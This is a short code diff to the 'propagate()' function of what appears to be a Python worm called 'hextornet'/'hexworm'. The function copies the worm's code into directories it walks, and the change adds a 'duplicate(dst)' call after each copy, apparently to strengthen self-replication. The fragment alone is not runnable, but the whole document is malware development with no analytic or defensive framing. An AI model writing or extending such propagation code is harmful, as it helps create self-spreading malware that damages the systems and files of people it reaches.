@@ -204,6 +204,7 @@ def propagate():
 				dst = os.getcwd() + "hextornet.py"
 			#run(dst)
 			copyHex(hexworm, src, dst)
+			duplicate(dst)
 			directories.remove(directory)
 	print("=================================")
 
